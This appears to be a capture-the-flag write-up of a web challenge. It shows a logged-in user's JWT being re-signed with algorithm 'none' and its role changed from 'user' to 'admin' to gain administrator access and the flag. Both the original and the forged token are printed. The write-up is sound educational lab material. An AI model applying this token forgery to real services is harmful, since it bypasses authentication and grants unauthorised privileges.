
We are greeted with this web-page

![[Pasted image 20240814220923.png]]


Then we log in with the credentials given to us: 

```
test : Test123!
```


We get this:

![[Pasted image 20240814221116.png]]


We notice that there is a JWT token added onto our session:

![[Pasted image 20240814221140.png]]

```
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJhdXRoIjoxNzIzNjUzNjA4OTI1LCJhZ2VudCI6Ik1vemlsbGEvNS4wIChYMTE7IExpbnV4IHg4Nl82NDsgcnY6MTI5LjApIEdlY2tvLzIwMTAwMTAxIEZpcmVmb3gvMTI5LjAiLCJyb2xlIjoidXNlciIsImlhdCI6MTcyMzY1MzYwOX0.W3ZpF2VhdVttCPpJWFQ5UyoK8jBGWIiZCBVVWqMHI68
```


We visit this website:

```
https://www.gavinjl.me/edit-jwt-online-alg-none/
```



We set algorithm to none:

![[Pasted image 20240814221309.png]]


And we change the role to 'admin':

![[Pasted image 20240814221332.png]]



We get this final new token:

```
eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJhdXRoIjoxNzIzNjUzNjA4OTI1LCJhZ2VudCI6Ik1vemlsbGEvNS4wIChYMTE7IExpbnV4IHg4Nl82NDsgcnY6MTI5LjApIEdlY2tvLzIwMTAwMTAxIEZpcmVmb3gvMTI5LjAiLCJyb2xlIjoiYWRtaW4iLCJpYXQiOjE3MjM2NTM2MDl9.
```


We set this value as of our token


We get this page:

![[Pasted image 20240814221627.png]]


Hence we get  our flag.